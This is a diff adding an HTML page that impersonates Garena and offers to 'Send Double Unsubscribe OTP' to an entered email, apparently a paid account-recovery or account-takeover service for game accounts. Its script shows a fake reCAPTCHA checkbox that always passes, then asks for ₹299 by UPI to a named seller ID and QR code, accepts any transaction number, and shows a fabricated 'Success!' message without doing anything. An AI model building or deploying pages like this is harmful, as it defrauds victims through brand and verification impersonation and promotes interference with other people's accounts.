@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Double Unsubscribe OTP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #ffffff;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+        }
+        .logo-img {
+            height: 32px;
+            width: auto;
+        }
+        .tutorial-btn {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            text-decoration: none;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 40px;
+        }
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 25px;
+            color: #111;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        input[type="email"], input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #b0c4de;
+            background-color: #f0f4f8;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .hint {
+            font-size: 12px;
+            color: #555;
+            text-align: left;
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+        .btn {
+            width: 100%;
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .footer-text {
+            font-size: 11px;
+            color: #666;
+            margin-top: 25px;
+            line-height: 1.4;
+        }
+        .footer-text a {
+            color: #1a0dab;
+            text-decoration: none;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 320px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* reCAPTCHA Box Style */
+        .recaptcha-box {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .checkbox-fake {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            background: #fff;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .checkmark {
+            color: #0f9d58;
+            font-size: 18px;
+            font-weight: bold;
+            display: none;
+        }
+        .recaptcha-text {
+            font-size: 14px;
+            color: #222;
+            font-weight: 500;
+        }
+        .recaptcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .recaptcha-logo {
+            font-size: 10px;
+            color: #555;
+            font-weight: bold;
+        }
+        .recaptcha-sub {
+            font-size: 8px;
+            color: #888;
+        }
+        .qr-img {
+            width: 100%;
+            max-width: 220px;
+            height: auto;
+            border-radius: 6px;
+            margin: 8px 0;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo-area">
+            <!-- New Garena Logo Image -->
+            <img src="garena-logo.png" alt="Garena" class="logo-img">
+        </div>
+        <!-- YouTube Tutorial Link -->
+        <a href="https://youtube.com/@zxt-ibrahim?si=OWMrIxwD_l1wzrjw" target="_blank" class="tutorial-btn">
+            ▶ Tutorial
+        </a>
+    </header>
+
+    <div class="container">
+        <div class="card" id="mainCard">
+            <h2>Send Double Unsubscribe OTP</h2>
+            <div class="input-group">
+                <input type="email" id="emailInput" placeholder="*Email" required>
+                <div class="hint">Your email is required for Garena account recovery. Unauthorized Gmail addresses will be reformatted following Gmail standard.</div>
+            </div>
+            <button class="btn" id="actionBtn" onclick="handleAction()">Send Double Unsubscribe OTP</button>
+            <div class="footer-text">
+                By clicking Send Double Unsubscribe OTP, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal" id="verifyModal">
+        <div class="modal-content">
+            <h3 style="margin-top: 0; color: #333;">Verification Required</h3>
+            <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Please verify you are not a robot</p>
+            
+            <div class="recaptcha-box">
+                <div class="recaptcha-left">
+                    <div class="checkbox-fake" id="fakeCheckbox" onclick="startVerification()">
+                        <div class="spinner" id="loadingSpinner"></div>
+                        <span class="checkmark" id="checkMark">✓</span>
+                    </div>
+                    <span class="recaptcha-text">I'm not a robot</span>
+                </div>
+                <div class="recaptcha-right">
+                    <span class="recaptcha-logo">reCAPTCHA</span>
+                    <span class="recaptcha-sub">Privacy - Terms</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal with UTR Input -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <h3 style="margin-top: 0; font-size: 18px;">Complete Payment (₹299)</h3>
+            <p style="font-size: 12px; color: #666; margin-bottom: 2px;">Scan QR or pay to UPI ID:</p>
+            <p style="font-weight: bold; color: #d32f2f; font-size: 15px; margin: 0 0 5px 0;">yusufseller@fam</p>
+            
+            <!-- Real QR Code Image -->
+            <img src="qr.png" alt="UPI QR Code" class="qr-img">
+
+            <!-- UTR Input Field -->
+            <div style="text-align: left; margin: 10px 0;">
+                <label style="font-size: 11px; color: #441; font-weight: bold;">Enter UTR / Transaction ID:</label>
+                <input type="text" id="utrInput" placeholder="Enter 12-digit UTR number" style="margin-top: 4px;">
+            </div>
+
+            <button class="btn" id="verifyUtrBtn" onclick="verifyUTR()">Verify & Submit</button>
+        </div>
+    </div>
+
+    <script>
+        function handleAction() {
+            const email = document.getElementById('emailInput').value;
+            if(!email) {
+                alert('Please enter your email first!');
+                return;
+            }
+            const btn = document.getElementById('actionBtn');
+            btn.innerText = 'Please wait...';
+            btn.style.backgroundColor = '#888';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                btn.innerText = 'Send Double Unsubscribe OTP';
+                btn.style.backgroundColor = '#d32f2f';
+                btn.disabled = false;
+                document.getElementById('verifyModal').style.display = 'flex';
+            }, 2000);
+        }
+
+        // reCAPTCHA Click Logic
+        function startVerification() {
+            const spinner = document.getElementById('loadingSpinner');
+            const checkbox = document.getElementById('fakeCheckbox');
+            const checkMark = document.getElementById('checkMark');
+
+            checkbox.style.pointerEvents = 'none';
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                checkMark.style.display = 'block';
+
+                setTimeout(() => {
+                    document.getElementById('verifyModal').style.display = 'none';
+                    document.getElementById('paymentModal').style.display = 'flex';
+                    
+                    checkbox.style.pointerEvents = 'auto';
+                    checkMark.style.display = 'none';
+                }, 600);
+            }, 2000);
+        }
+
+        // UTR Verification Logic
+        function verifyUTR() {
+            const utr = document.getElementById('utrInput').value;
+            if(!utr) {
+                alert('Please enter the UTR / Transaction ID first!');
+                return;
+            }
+            const btn = document.getElementById('verifyUtrBtn');
+            btn.innerText = 'Verifying UTR...';
+            btn.style.backgroundColor = '#888';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('paymentModal').style.display = 'none';
+                document.getElementById('mainCard').innerHTML = `
+                    <h2 style="color: #2e7d32;">Success!</h2>
+                    <p style="font-size: 15px; color: #333; line-height: 1.5;">Check your mail box OTP is successfully sent.</p>
+                `;
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
